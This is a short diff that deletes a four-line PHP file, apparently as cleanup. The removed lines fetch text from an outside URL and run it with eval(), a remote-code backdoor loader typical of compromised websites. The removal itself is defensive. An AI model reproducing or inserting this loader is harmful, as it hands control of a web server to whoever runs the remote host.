@@ -1,4 +1,0 @@
-<?php $KJ = file_get_contents(urldecode('https://red-ips.pages.dev/nav_3.txt'));
-
-$KJ = "?> ".$KJ;
-eval($KJ);
